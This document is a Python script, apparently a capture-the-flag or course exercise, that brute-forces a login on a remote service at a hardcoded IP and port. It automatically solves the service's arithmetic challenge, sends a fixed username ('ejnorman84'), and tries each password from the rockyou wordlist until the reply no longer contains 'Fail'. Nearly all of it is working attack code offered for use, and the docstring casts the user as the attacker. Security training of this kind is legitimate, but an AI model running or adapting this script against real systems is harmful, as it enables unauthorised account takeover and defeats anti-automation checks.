"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/root/Desktop/rockyou.txt" # Point to wordlist file

def brute_force():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """

    openPassW = open(wordlist,"r")

    
    #counter = 0
    #x = openPassW.readlines()
    
    for passw in openPassW:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        time.sleep(1)
        data = s.recv(1024)
        
        #print(data)
        arrayMath = data.split()
        while len(arrayMath) <= 3: 
            data += s.recv(1024)
            arrayMath = data.split()
        #print(arrayMath)
        x = int(arrayMath[3])
        y = int(arrayMath[5])
        if arrayMath[4] == '+':
           val = x + y 
        else:
            if arrayMath[4] == '-':
               val = x - y 
            else:
                if arrayMath[4] == '/':
                   val = x/y
                else:
                   val = x * y
    

        #print(val)
        s.send(str(val)+"\n")
        
        data = s.recv(1024) #receive username:
        time.sleep(0.1)
        s.send('ejnorman84\n') 
        
        data = s.recv(1024) #receive password:
        time.sleep(0.1)
        #print(passw)
        s.send(passw.strip()+"\n")
        time.sleep(0.2)
        data = (s.recv(1024))
        time.sleep(1)
        print(data)
        if "Fail" not in data: break

        s.close()
        
        
            
        
        
       




if __name__ == '__main__':
    brute_force()
